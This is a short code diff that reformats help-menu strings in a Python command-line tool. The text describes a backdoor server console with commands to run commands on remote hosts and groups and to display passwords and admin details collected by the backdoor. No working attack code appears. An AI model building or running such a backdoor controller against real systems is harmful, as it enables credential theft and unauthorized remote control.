@@ -25,28 +25,28 @@ def status():
 
 def help_cmd(cmd=None):
     help_help = """ 
-    help [command] - Show help for CLI commands (this menu right here!)
+help [command] - Show help for CLI commands (this menu right here!)
     """
     set_help = """ 
-    set group <ip addresses> - Create a group of IP addresses (Not implemented)\n
-    set target <ip address/group> - Set target host or group for exec command (Not implemented)
+set group <ip addresses> - Create a group of IP addresses (Not implemented)
+set target <ip address/group> - Set target host or group for exec command (Not implemented)
     """
     exec_help = """ 
-    exec <ip address/group> <command> - Executes a command on a host or group of hosts (Not implemented)
+exec <ip address/group> <command> - Executes a command on a host or group of hosts (Not implemented)
     """ 
     ping_help = """ 
-    ping <ip address> - Ansible pings an IP address (WIP)
+ping <ip address> - Ansible pings an IP address (WIP)
     """ 
     show_help = """ 
-    show status - Show server status and connected IP addresses\n
-    show args - Show backdoor server arguments\n
-    show db [host] - Show collected passwords and admin information from backdoor, can specify specific host\n
-    show passwords [host] - Alias for show db (same functionality)
+show status - Show server status and connected IP addresses
+show args - Show backdoor server arguments
+show db [host] - Show collected passwords and admin information from backdoor, can specify specific host
+show passwords [host] - Alias for show db (same functionality)
     """
     server_help = """
-    server up - Start backdoor server\n
-    server down - Stop backdoor server (WIP)\n
-    server args <argument string> - Set server arguments (in command line argument style)
+server up - Start backdoor server
+server down - Stop backdoor server (WIP)
+server args <argument string> - Set server arguments (in command line argument style)
     """ 
 
     if(cmd):
